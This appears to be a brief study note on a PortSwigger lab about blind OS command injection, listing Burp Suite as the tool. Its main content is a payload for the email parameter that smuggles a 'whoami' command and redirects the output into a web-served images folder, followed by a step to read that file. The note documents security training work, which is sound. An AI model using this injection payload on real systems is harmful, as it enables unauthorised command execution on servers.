# Blind OS command injection with output redirection

Source: Portswigger
Tools: Burpsuite
Technique: Blind, OS Command Injection
Fields: Web

- Modify the `email` parameter, changing it to:

email=||whoami>/var/www/images/output.txt||
- read file output.txt